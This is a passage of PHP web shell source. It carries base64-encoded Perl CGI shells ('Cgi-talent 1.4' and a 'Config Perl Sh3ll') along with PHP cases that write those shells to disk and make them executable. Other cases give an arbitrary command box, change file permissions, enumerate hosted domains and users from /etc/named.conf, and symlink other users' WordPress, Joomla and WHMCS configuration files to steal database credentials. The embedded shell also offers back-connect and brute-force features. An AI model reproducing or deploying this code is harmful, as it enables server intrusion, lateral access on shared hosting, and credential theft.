ZpZXc9Ii4kZjsNCgkJCSRyZXN1bHQgLj0gIjx0ciBjbGFzcz0nJHN0eWxlJz48dGQgaWQ9J0ZpbGVfJGknIGNsYXNzPSdmaWxlJz48YSBocmVmPSc/YT1jb21tYW5kJmQ9Ii4mRW5jb2RlRGlyKCRwYXRoKS4iJmM9Ii4kYWN0aW9uLiInPiIuJGZpbGUuIjwvYT48L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQ+Ii4mUGFyc2VGaWxlU2l6ZSgmRmlsZVNpemUoJGYpKS4iPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkPiIuJkZpbGVPd25lcigkZikuIjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBpZD0nRmlsZVBlcm1zXyRpJyBvbmRibGNsaWNrPVwicm1fY2htb2RfZm9ybSh0aGlzLCIuJGkuIiwnIi4mRmlsZVBlcm1zKCRmKS4iJywnIi4kZmlsZS4iJylcIiA+PHNwYW4gb25jbGljaz1cImNobW9kX2Zvcm0oJGksJyRmaWxlJylcIiA+Ii4mRmlsZVBlcm1zKCRmKS4iPC9zcGFuPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZD4iLiZGaWxlTGFzdE1vZGlmaWVkKCRmKS4iPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkPjxhIG9uY2xpY2s9XCJyZW5hbWVfZm9ybSgkaSwnJGZpbGUnLCdmJyk7IHJldHVybiBmYWxzZTtcIj5SZW5hbWU8L2E+IHwgPGEgaHJlZj0nP2E9ZG93bmxvYWQmbz1nbyZmPSIuJGYuIic+RG93bmxvYWQ8L2E+IHwgPGEgb25jbGljaz1cImlmKCFjb25maXJtKCdSZW1vdmUgZmlsZTogJGZpbGUgPycpKSB7IHJldHVybiBmYWxzZTt9XCIgaHJlZj0nP2E9Z3VpJmQ9Ii4mRW5jb2RlRGlyKCRwYXRoKS4iJnJlbW92ZT0kZmlsZSc+UmVtb3ZlPC9hPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjwvdHI+IjsNCgkJCSRpKys7DQoJCX0NCgkJJHJlc3VsdCAuPSAiPC90YWJsZT48L2Rpdj4iOw0KCX0NCglyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVHJ5IHRvIFZpZXcgTGlzdCBVc2VyDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgVmlld0RvbWFpblVzZXINCnsNCglvcGVuIChkMG1haW5zLCAnL2V0Yy9uYW1lZC5jb25mJykgb3IgJGVycj0xOw0KCW15IEBjbnpzID0gPGQwbWFpbnM+Ow0KCWNsb3NlIGQwbWFpbnM7DQoJbXkgJHN0eWxlPSJsaW5lIjsNCglteSAkcmVzdWx0PSI8aDM+PGZvbnQgc3R5bGU9J2ZvbnQ6IDE1cHQgVmVyZGFuYTtjb2xvcjogI2ZmOTkwMDsnPkRvbWFpbiArIFVzZXI8L2ZvbnQ+PC9oMz4iOw0KCWlmICgkZXJyKQ0KCXsNCgkJJHJlc3VsdCAuPSAgKCc8cD5DMHVsZG5cJ3QgQnlwYXNzIGl0ICwgU29ycnk8L3A+Jyk7DQoJCXJldHVybiAkcmVzdWx0Ow0KCX1lbHNlDQoJew0KCQkkcmVzdWx0IC49ICc8dGFibGUgaWQ9ImRvbWFpbiI+PHRyPjx0aD5kMG1haW5zPC90aD4gPHRoPlVzZXI8L3RoPjwvdHI+JzsNCgl9DQoJZm9yZWFjaCBteSAkb25lIChAY256cykNCgl7DQoJCWlmKCRvbmUgPX4gbS8uKj96b25lICIoLio/KSIgey8pDQoJCXsJDQoJCQkkc3R5bGU9ICgkc3R5bGUgZXEgImxpbmUiKSA/ICJub3RsaW5lIjogImxpbmUiOw0KCQkJJGZpbGVuYW1lPSB0cmltKCIvZXRjL3ZhbGlhc2VzLyIuJDEpOw0KCQkJJG93bmVyID0gZ2V0cHd1aWQoKHN0YXQoJGZpbGVuYW1lKSlbNF0pOw0KCQkJJHJlc3VsdCAuPSAnPHRyIHN0eWxlPSIkc3R5bGUiIHdpZHRoPTUwJT48dGQ+PGEgaHJlZj0iaHR0cDovLycuJDEuJyIgdGFyZ2V0PSJfYmxhbmsiPicuJDEuJzwvYT48L3RkPjx0ZD4gJy4kb3duZXIuJzwvdGQ+PC90cj4nOw0KCQl9DQoJfQ0KCSRyZXN1bHQgLj0gJzwvdGFibGU+JzsNCglyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVmlldyBMb2cNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBWaWV3TG9nDQp7DQoJJEVuY29kZUN1cnJlbnREaXIgPSBFbmNvZGVEaXIoJEN1cnJlbnREaXIpOw0KCWlmKCRXaW5OVCkNCgl7DQoJCXJldHVybiAiPGgyPjxmb250IHN0eWxlPSdmb250OiAyMHB0IFZlcmRhbmE7Y29sb3I6ICNmZjk5MDA7Jz5Eb24ndCBydW4gb24gV2luZG93czwvZm9udD48L2gyPiI7DQoJfQ0KCW15ICRyZXN1bHQ9Ijx0YWJsZT48dHI+PHRoPlBhdGggTG9nPC90aD48dGg+U3VibWl0PC90aD48L3RyPiI7DQoJbXkgQHBhdGhsb2c9KAknL3Vzci9sb2NhbC9hcGFjaGUvbG9ncy9lcnJvcl9sb2cnLA0KCQkJJy91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvYWNjZXNzX2xvZycsDQoJCQknL3Vzci9sb2NhbC9hcGFjaGUyL2NvbmYvaHR0cGQuY29uZicsDQoJCQknL3Zhci9sb2cvaHR0cGQvZXJyb3JfbG9nJywNCgkJCScvdmFyL2xvZy9odHRwZC9hY2Nlc3NfbG9nJywNCgkJCScvdXNyL2xvY2FsL2NwYW5lbC9sb2dzL2Vycm9yX2xvZycsDQoJCQknL3Vzci9sb2NhbC9jcGFuZWwvbG9ncy9hY2Nlc3NfbG9nJywNCgkJCScvdXNyL2xvY2FsL2FwYWNoZS9sb2dzL3N1cGhwX2xvZycsDQoJCQknL3Vzci9sb2NhbC9jcGFuZWwvbG9ncycsDQoJCQknL3Vzci9sb2NhbC9jcGFuZWwvbG9ncy9zdGF0c19sb2cnLA0KCQkJJy91c3IvbG9jYWwvY3BhbmVsL2xvZ3MvYWNjZXNzX2xvZycsDQoJCQknL3Vzci9sb2NhbC9jcGFuZWwvbG9ncy9lcnJvcl9sb2cnLA0KCQkJJy91c3IvbG9jYWwvY3BhbmVsL2xvZ3MvbGljZW5zZV9sb2cnLA0KCQkJJy91c3IvbG9jYWwvY3BhbmVsL2xvZ3MvbG9naW5fbG9nJywNCgkJCScvdXNyL2xvY2FsL2NwYW5lbC9sb2dzL3N0YXRzX2xvZycsDQoJCQknL3Zhci9jcGFuZWwvY3BhbmVsLmNvbmZpZycsDQoJCQknL3Vzci9sb2NhbC9waHAvbGliL3BocC5pbmknLA0KCQkJJy91c3IvbG9jYWwvcGhwNS9saWIvcGhwLmluaScsDQoJCQknL3Zhci9sb2cvbXlzcWwvbXlzcWwtYmluLmxvZycsDQoJCQknL3Zhci9sb2cvbXlzcWwubG9nJywNCgkJCScvdmFyL2xvZy9teXNxbGRlcnJvci5sb2cnLA0KCQkJJy92YXIvbG9nL215c3FsL215c3FsLmxvZycsDQoJCQknL3Zhci9sb2cvbXlzcWwvbXlzcWwtc2xvdy5sb2cnLA0KCQkJJy92YXIvbXlzcWwubG9nJywNCgkJCScvdmFyL2xpYi9teXNxbC9teS5jbmYnLA0KCQkJJy9ldGMvbXlzcWwvbXkuY25mJywNCgkJCScvZXRjL215LmNuZicsDQoJCQkpOw0KCW15ICRpPTA7DQoJbXkgJHBlcm1zOw0KCW15ICRzbDsNCglmb3JlYWNoIG15ICRsb2cgKEBwYXRobG9nKQ0KCXsNCgkJaWYoLXIgJGxvZykNCgkJew0KCQkJJHBlcm1zPSJPSyI7DQoJCX1lbHNlDQoJCXsNCgkJCSRwZXJtcz0iPGZvbnQgc3R5bGU9J2NvbG9yOiByZWQ7Jz5DYW5jZWw8Zm9udD4iOw0KCQl9DQoJCSRyZXN1bHQgLj08PEVORDsNCgkJPHRyPg0KDQoJCQk8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0IiBvblN1Ym1pdD0iRW5jb2RlcignbG9nJGknKSI+DQoJCQk8dGQ+PGlucHV0IHR5cGU9InRleHQiIGlkPSJsb2ckaSIgbmFtZT0iYyIgdmFsdWU9InRhaWwgLTEwMDAwICRsb2cgfCBncmVwICcvaG9tZSciIHNpemU9JzUwJy8+PC90ZD4NCgkJCTx0ZD48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iVHJ5IiAvPjwvdGQ+DQoJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCIgLz4NCgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkRW5jb2RlQ3VycmVudERpciIgLz4NCgkJCTwvZm9ybT4NCgkJCTx0ZD4kcGVybXM8L3RkPg0KDQoJCTwvdHI+DQpFTkQNCgkJJGkrKzsNCgl9DQoJJHJlc3VsdCAuPSI8L3RhYmxlPiI7DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIE1haW4gUHJvZ3JhbSAtIEV4ZWN1dGlvbiBTdGFydHMgSGVyZQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KJlJlYWRQYXJzZTsNCiZHZXRDb29raWVzOw0KDQokU2NyaXB0TG9jYXRpb24gPSAkRU5WeydTQ1JJUFRfTkFNRSd9Ow0KJFNlcnZlck5hbWUgPSAkRU5WeydTRVJWRVJfTkFNRSd9Ow0KJExvZ2luUGFzc3dvcmQgPSAkaW57J3AnfTsNCiRSdW5Db21tYW5kID0gZGVjb2RlX2Jhc2U2NCgkaW57J2MnfSk7DQokVHJhbnNmZXJGaWxlID0gJGlueydmJ307DQokT3B0aW9ucyA9ICRpbnsnbyd9Ow0KJEFjdGlvbiA9ICRpbnsnYSd9Ow0KDQokQWN0aW9uID0gImNvbW1hbmQiIGlmKCRBY3Rpb24gZXEgIiIpOyAjIG5vIGFjdGlvbiBzcGVjaWZpZWQsIHVzZSBkZWZhdWx0DQoNCiMgZ2V0IHRoZSBkaXJlY3RvcnkgaW4gd2hpY2ggdGhlIGNvbW1hbmRzIHdpbGwgYmUgZXhlY3V0ZWQNCiRDdXJyZW50RGlyID0gJlRyaW1TbGFzaGVzKGRlY29kZV9iYXNlNjQodHJpbSgkaW57J2QnfSkpKTsNCiMgbWFjIGRpbmggeHVhdCB0aG9uZyB0aW4gbmV1IGtvIGNvIGxlbmggbmFvIQ0KJFJ1bkNvbW1hbmQ9ICRXaW5OVD8iZGlyIjoiZGlyIC1saWEiIGlmKCRSdW5Db21tYW5kIGVxICIiKTsNCmNob21wKCRDdXJyZW50RGlyID0gYCRDbWRQd2RgKSBpZigkQ3VycmVudERpciBlcSAiIik7DQoNCiRMb2dnZWRJbiA9ICRDb29raWVzeydTQVZFRFBXRCd9IGVxICRQYXNzd29yZDsNCg0KaWYoJEFjdGlvbiBlcSAibG9naW4iIHx8ICEkTG9nZ2VkSW4pIAkJIyB1c2VyIG5lZWRzL2hhcyB0byBsb2dpbg0Kew0KCSZQZXJmb3JtTG9naW47DQp9ZWxzaWYoJEFjdGlvbiBlcSAiZ3VpIikgIyBHVUkgZGlyZWN0b3J5DQp7DQoJJlByaW50UGFnZUhlYWRlcigiZCIpOw0KCWlmKCEkV2luTlQpDQoJew0KCQkkY2htb2Q9aW50KCRpbnsnY2htb2QnfSk7DQoJCWlmKCRjaG1vZCBuZSAwKQ0KCQl7DQoJCQkkY2htb2Q9aW50KCRpbnsnY2htb2QnfSk7DQoJCQkkZmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kVHJhbnNmZXJGaWxlOw0KCQkJaWYoY2htb2QoJGNobW9kLCRmaWxlKSkNCgkJCXsNCgkJCQlwcmludCAiPHJ1bj4gRG9uZSEgPC9ydW4+PGJyPiI7DQoJCQl9ZWxzZQ0KCQkJew0KCQkJCXByaW50ICI8cnVuPiBTb3JyeSEgWW91IGRvbnQgaGF2ZSBwZXJtaXNzaW9ucyEgPC9ydW4+PGJyPiI7DQoJCQl9DQoJCX0NCgl9DQoJJHJlbmFtZT0kaW57J3JlbmFtZSd9Ow0KCWlmKCRyZW5hbWUgbmUgIiIpDQoJew0KCQlpZihyZW5hbWUoJFRyYW5zZmVyRmlsZSwkcmVuYW1lKSkNCgkJew0KCQkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOw0KCQl9ZWxzZQ0KCQl7DQoJCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOw0KCQl9DQoJfQ0KCSRyZW1vdmU9JGlueydyZW1vdmUnfTsNCglpZigkcmVtb3ZlIG5lICIiKQ0KCXsNCgkJJHJtID0gJEN1cnJlbnREaXIuJFBhdGhTZXAuJHJlbW92ZTsNCgkJaWYoLWQgJHJtKQ0KCQl7DQoJCQkmUm1EaXIoJHJtKTsNCgkJfWVsc2UNCgkJew0KCQkJaWYodW5saW5rKCRybSkpDQoJCQl7DQoJCQkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOw0KCQkJfWVsc2UNCgkJCXsNCgkJCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOw0KCQkJfQkJCQ0KCQl9DQoJfQ0KCXByaW50ICZMaXN0RGlyOw0KDQp9DQplbHNpZigkQWN0aW9uIGVxICJjb21tYW5kIikJCQkJIAkjIHVzZXIgd2FudHMgdG8gcnVuIGEgY29tbWFuZA0Kew0KCSZQcmludFBhZ2VIZWFkZXIoImMiKTsNCglwcmludCAmRXhlY3V0ZUNvbW1hbmQ7DQp9DQplbHNpZigkQWN0aW9uIGVxICJzYXZlIikJCQkJIAkjIHVzZXIgd2FudHMgdG8gc2F2ZSBhIGZpbGUNCnsNCgkmUHJpbnRQYWdlSGVhZGVyOw0KCWlmKCZTYXZlRmlsZSgkaW57J2RhdGEnfSwkaW57J2ZpbGUnfSkpDQoJew0KCQlwcmludCAiPHJ1bj4gRG9uZSEgPC9ydW4+PGJyPiI7DQoJfWVsc2UNCgl7DQoJCXByaW50ICI8cnVuPiBTb3JyeSEgWW91IGRvbnQgaGF2ZSBwZXJtaXNzaW9ucyEgPC9ydW4+PGJyPiI7DQoJfQ0KCXByaW50ICZMaXN0RGlyOw0KfWVsc2lmKCRBY3Rpb24gZXEgInVwbG9hZCIpIAkJCQkJIyB1c2VyIHdhbnRzIHRvIHVwbG9hZCBhIGZpbGUNCnsNCgkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoJcHJpbnQgJlVwbG9hZEZpbGU7DQp9ZWxzaWYoJEFjdGlvbiBlcSAiYmFja2JpbmQiKSAJCQkJIyB1c2VyIHdhbnRzIHRvIGJhY2sgY29ubmVjdCBvciBiaW5kIHBvcnQNCnsNCgkmUHJpbnRQYWdlSGVhZGVyKCJjbGllbnRwb3J0Iik7DQoJcHJpbnQgJkJhY2tCaW5kOw0KfWVsc2lmKCRBY3Rpb24gZXEgImJydXRlZm9yY2VyIikgCQkJIyB1c2VyIHdhbnRzIHRvIGJydXRlIGZvcmNlDQp7DQoJJlByaW50UGFnZUhlYWRlcjsNCglwcmludCAmQnJ1dGVGb3JjZXI7DQp9ZWxzaWYoJEFjdGlvbiBlcSAiZG93bmxvYWQiKSAJCQkJIyB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZQ0Kew0KCXByaW50ICZEb3dubG9hZEZpbGU7DQp9ZWxzaWYoJEFjdGlvbiBlcSAiY2hlY2tsb2ciKSAJCQkJIyB1c2VyIHdhbnRzIHRvIHZpZXcgbG9nIGZpbGUNCnsNCgkmUHJpbnRQYWdlSGVhZGVyOw0KCXByaW50ICZWaWV3TG9nOw0KDQp9ZWxzaWYoJEFjdGlvbiBlcSAiZG9tYWluc3VzZXIiKSAJCQkjIHVzZXIgd2FudHMgdG8gdmlldyBsaXN0IHVzZXIvZG9tYWluDQp7DQoJJlByaW50UGFnZUhlYWRlcjsNCglwcmludCAmVmlld0RvbWFpblVzZXI7DQp9ZWxzaWYoJEFjdGlvbiBlcSAibG9nb3V0IikgCQkJCSMgdXNlciB3YW50cyB0byBsb2dvdXQNCnsNCgkmUGVyZm9ybUxvZ291dDsNCn0NCiZQcmludFBhZ2VGb290ZXI7';
$file = fopen("cgi4e.izo" ,"w+");
$write = fwrite ($file ,base64_decode($cgi4e));
fclose($file);
chmod("cgi4e.izo",0755);
echo "</div><center><br><b><a href=cgi4e/cgi4e.izo target='_blank'><div><span style=color:#6ebe0b;font-family:Arial;font-size:11px;>Cgi-talent 1.4</span></div></a><br>Pass:iqteam</b></center>
<iframe src=cgi4e/cgi4e.izo width=100% height=40% ></iframe></center>"; 
        
        break;
        
        	case'shell':
	echo'<form action="?dir='.$_GET['dir'].'&amp;fr=shell" method="post">
<table class="cmdbox">
<tr><td colspan="2">
<textarea class="output" readonly>';

if(isset($_POST['submitcmd'])) {
	echo sys($_POST['cmd']);
		echo sys(base64_decode($_POST['cmd']));

}
?>
</textarea>
<tr><td colspan="2"><?php getmyuid(); ?><input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="cmd" style="width:60%;" value="" /><input class="inputzbut" type="submit" value="Go !" name="submitcmd" style="width:12%;" /><br><? echo als();?></td></tr>
</table>
</form><?
	
	break;
	case'rename':
	 fileinfo();
	 if(isset($_POST['fileold']))
                {
                    if(rename($_POST['fileold'],$_POST['filenew']))
                    {
                        print "File renamed.";
                        					echo'<a href=?dir='.$_GET['dir'].'>[Back]</a>';

                    }
                    else
                    {
                        print "Couldn't rename file.";
                        					echo'<a href=?dir='.$_GET['dir'].'>[Back]</a>';

                    }
                    
                }
                if(isset($_GET['file']))
                {
                    $file = basename(htmlspecialchars($_GET['file']));
                }
                else
                {
                    $file = "";
                }
                
                print "Renaming ".$file."<br>
                                <form action=\"".$me."?fr=rename&dir=".realpath('.')."\" method=POST>
                    <b>Rename:<br></b><input type=text name=fileold value=\"".$file."\" size=70><br>
                    <b>To:<br><input type=text name=filenew value=\"\" size=10><br>
                    <input type=submit value=\"Rename file\">
                    </form>";
	break;
	case'cnof':
	
		echo'hi';
		$d0mains = @file("/etc/named.conf");
		
				if($d0mains)
				{
					mkdir("MRFRIEZA");
					chdir("MRFRIEZA");
										
					foreach($d0mains as $d0main)
					{
						if(eregi("zone",$d0main))
						{
							preg_match_all('#zone "(.*)"#', $d0main, $domains);
							flush();
								
							if(strlen(trim($domains[1][0])) > 2)
							{ 
								$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
								
								syml($user['name'],$domains[1][0]);					
							}
						}
					}
					echo "<br><center><a href=MRFRIEZA target=_blank><font class=txt>| ./d0ne |</font></a></center>"; 
				}
				else
				{
					mkdir("MRFRIEZA1");
					chdir("MRFRIEZA1");
					$temp = "";
					$val1 = 0;
					$val2 = 1000;
					for(;$val1 <= $val2;$val1++) 
					{
						$uid = @posix_getpwuid($val1);
						if ($uid)
							$temp .= join(':',$uid)."\n";
					 }
					 echo '<br/>';
					 $temp = trim($temp);
					 
					 $file5 = fopen("test.txt","w");
					 fputs($file5,$temp);
					 fclose($file5);
					 
					 $file = fopen("test.txt", "r") or exit("Error Try Create file");
					 while(!feof($file))
					 {
						$s = fgets($file);
						$matches = array();
						$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
						$matches = str_replace("home/","",$matches[1]);
						if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
							continue;
						syml($matches,$matches);
					 }
					fclose($file);
					echo "</table>";
					unlink("test.txt");
			
					echo "<br><center><a href=MRFRIEZA1 target=_blank><font class=txt>| ./d0ne |</font></a></center>"; 
				}
	
	break;
	case 'chmod':
                
                fileinfo();
                
                if(isset($_POST['chmod']))
                {
                switch ($_POST['chvalue']){
                    case 777:
                    chmod($_POST['chmod'],0777);
                    break;
                    case 644:
                    chmod($_POST['chmod'],0644);
                    break;
                    case 755:
                    chmod($_POST['chmod'],0755);
                    break;
                }
                print "Changed permissions on ".$_POST['chmod']." to ".$_POST['chvalue'].".";
                }
                if(isset($_GET['file']))
                {
                    $content = urldecode($_GET['file']);
                }
                else
                {
                    $content = "file/path/please";
                }
                
                print "<form action=\"".$me."?fr=chmod&file=".$content."&dir=".realpath('.')."\" method=POST><b>File to chmod:
                <input type=text name=chmod value=\"".$content."\" size=70><br><b>New permission:</b>
                <select name=\"chvalue\">
<option value=\"777\">777</option>
<option value=\"644\">644</option>
<option value=\"755\">755</option>
</select><input type=submit value=\"Change\">";
                
            break;
            case'con':
             @mkdir('configsh3ll', 0755);
    chdir('configsh3ll');
        $hta = ".htaccess";
        $hta1 = "$hta";
        $crt = fopen ($hta1 , 'w') or die ("Cant Create File");
        $code = "AddHandler cgi-script .izo";    
        fwrite ( $crt , $code ) ;
        fclose ($crt);
$configshell = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50JzwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS10cmFuc2l0aW9uYWwuZHRkIj4NCjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1MYW5ndWFnZSIgY29udGVudD0iZW4tdXMiIC8+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCIgLz4NCjx0aXRsZT5bfl0gQ29uZmlnIFBlcmwgU2gzbGwgLSBbfl0gPC90aXRsZT4NCjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+DQoubmV3U3R5bGUxIHsNCiBmb250LWZhbWlseTogVGFob21hOw0KIGZvbnQtc2l6ZTogeC1zbWFsbDsNCiBmb250LXdlaWdodDogYm9sZDsNCiBjb2xvcjogIzAwRkZGRjsNCiAgdGV4dC1hbGlnbjogY2VudGVyOw0KfQ0KPC9zdHlsZT4NCjwvaGVhZD4NCic7DQpzdWIgbGlsew0KICAgICgkdXNlcikgPSBAXzsNCiRtc3IgPSBxeHtwd2R9Ow0KJGtvbGE9JG1zci4iLyIuJHVzZXI7DQoka29sYT1+cy9cbi8vZzsgDQoNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC92Yi9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nfn52QnVsbGV0aW4xLnR4dCcpOw0KCQlzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvY29uZmlnLnBocCcsJGtvbGEuJ35+dkJ1bGxldGluMi50eHQnKTsNCgkJc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLid+fnZCdWxsZXRpbjMudHh0Jyk7DQoJCXN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jYy9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nfn52QnVsbGV0aW40LnR4dCcpOw0KCQlzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jL2NvbmZpZy5waHAnLCRrb2xhLid+fm15YmIudHh0Jyk7DQoJCXN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcucGhwJywka29sYS4nfn5QaHBiYjEudHh0Jyk7DQoJCXN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmNsdWRlcy9jb25maWcucGhwJywka29sYS4nfn5QaHBiYjIudHh0Jyk7DQoJCXN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC1jb25maWcucGhwJywka29sYS4nfn5Xb3JkcHJlc3MxLnR4dCcpOw0KCQlzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmxvZy93cC1jb25maWcucGhwJywka29sYS4nfn5Xb3JkcHJlc3MyLnR4dCcpOw0KCQlzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fkpvb21sYTEudHh0Jyk7DQoJCXN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9nL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5Kb29tbGEyLnR4dCcpOw0KCQlzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5Kb29tbGEzLnR4dCcpOw0KCQlzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG0xLnR4dCcpOw0KCQlzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htYy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+V2htMi50eHQnKTsNCgkJc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTMudHh0Jyk7DQoJCXN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnQvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTQudHh0Jyk7DQoJCXN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+V2htNS50eHQnKTsNCgkJc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmcvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTYudHh0Jyk7DQoJCXN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nfn5XaG03LnR4dCcpOw0KCQlzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLid+fldobTgudHh0Jyk7DQoJCXN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vcmRlci9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJ35+V2htOS50eHQnKTsNCgkJc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmYucGhwJywka29sYS4nfn41LnR4dCcpOw0KCQlzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZmlnLnBocCcsJGtvbGEuJ35+NC50eHQnKTsNCgkJc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZfZ2xvYmFsLnBocCcsJGtvbGEuJ35+aW52aXNpby50eHQnKTsNCgkJc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGUvZGIucGhwJywka29sYS4nfn43LnR4dCcpOw0KCQlzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY29ubmVjdC5waHAnLCRrb2xhLid+fjgudHh0Jyk7DQoJCXN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ta19jb25mLnB